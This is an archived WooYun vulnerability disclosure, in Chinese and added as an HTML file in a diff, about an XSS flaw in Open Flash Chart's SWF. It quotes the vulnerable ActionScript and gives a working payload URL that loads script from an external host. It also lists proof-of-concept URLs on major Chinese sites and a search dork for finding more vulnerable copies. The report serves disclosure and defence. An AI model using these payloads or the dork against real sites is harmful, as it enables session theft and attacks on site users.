@@ -1,0 +1,258 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Open Flash Chart Xss 0day | 国内各网站需关注第三方FLASH产品安全  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Open Flash Chart Xss 0day | 国内各网站需关注第三方FLASH产品安全  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-05-18 10:16</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-05-18：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-05-18：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">和我之前发的 JWPlayer 存在同样的问题。利用方法也类似，就是地址栏里的参数不一样。 这个程序的使用范围之广，我就不多了说了。连乌云都是用的此图表程序，不过乌云比较幸运的是，用的旧版本，不存在此问题。<br />
+<br />
+我随手搜索了一下 open-flash-chart.swf<br />
+<br />
+shop.qq.com  域名下也存在该文件。<br />
+<br />
+google: inurl:(open-flash-chart.swf) site:.cn 也可以看看有多少记录。<br />
+<br />
+不难想象，图表演示程序，多用于数据统计，所以非常可能被广泛应用于商务方面的网站。<br />
+<br />
+至于XSS的危害，单个文件存在XSS不可怕，但是当存在问题的FLASH文件广泛存在于网上的时候，就不一样了。 </p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 漏洞问题出现在<br />
+<br />
+<br />
+<br />
+package main<br />
+<br />
+<br />
+<br />
+private function callExternalCallback(_arg1:String, ... _args){<br />
+<br />
+            if (ExternalInterface.available){<br />
+<br />
+                return (ExternalInterface.call(_arg1, _args));<br />
+<br />
+            };<br />
+<br />
+        }<br />
+<br />
+<br />
+<br />
+可以此处看到，建立了一个callExternalCallback函数。<br />
+<br />
+<br />
+<br />
+2. 我们再搜索callExternalCallback，会找到以下有问题的部分。<br />
+<br />
+<br />
+<br />
+</p><pre><code>var _local2 = &quot;open_flash_chart_data&quot;;<br />
+            if (this.chart_parameters[&quot;get-data&quot;]){<br />
+                _local2 = this.chart_parameters[&quot;get-data&quot;];<br />
+            };<br />
+            if (this.chart_parameters[&quot;id&quot;]){<br />
+                _local3 = this.callExternalCallback(_local2, this.chart_parameters[&quot;id&quot;]);<br />
+            } else {<br />
+                _local3 = this.callExternalCallback(_local2);<br />
+            };</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+从代码里可以看到， 直接call了_local2，而_local2来自于get-data参数<br />
+<br />
+<br />
+<br />
+因此我们可以构造以下代码。 以open flash chart 官网的SWF为例：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://openflashchart.com/sites/all/files/ofc_core/open-flash-chart.swf?get-data=(function()%7Blocation.href%3D&#039;javascript%3A%22%3Cscript%2Fsrc%3D%5C&#039;%2F%2Fappmaker.sinaapp.com%5C%2Ftest5.js%5C&#039;%3E%3C%2Fscript%3E%22&#039;%7D)</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">网易：（嘿嘿，jwplayer你没中招， 这次你中弹了吧～，虽然不是什么重要的域名）<br />
+<br />
+<br />
+<br />
+http://db.w.163.com/flash/open-flash-chart.swf?get-data=alert<br />
+<br />
+<br />
+<br />
+腾讯：你也中招了， 商务网站的哦～<br />
+<br />
+<br />
+<br />
+http://shop.qq.com/misc/seller/open-flash-chart.swf?get-data=alert<br />
+<br />
+<br />
+<br />
+新浪：也有<br />
+<br />
+<br />
+<br />
+http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=alert<br />
+<br />
+<br />
+<br />
+搜狐：<br />
+<br />
+<br />
+<br />
+http://soccer.sports.sohu.com/StyleDefault/Media/open-flash-chart.swf?get-data=alert<br />
+<br />
+<br />
+<br />
+百度:<br />
+<br />
+<br />
+<br />
+http://leju.baidu.com/static/flash/open-flash-chart.swf?get-data=alert<br />
+<br />
+<br />
+<br />
+...<br />
+<br />
+<br />
+<br />
+..<br />
+<br />
+<br />
+<br />
+其它的我就不找了。  </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">这个，各厂商自己看着办吧！！ 学学Facebook，把 ExternalInterface.call 自己封装了一下，对传入参数进行了严格的过滤！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07265" title="Open Flash Chart Xss 0day | 国内各网站需关注第三方FLASH产品安全">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：6 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7265";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
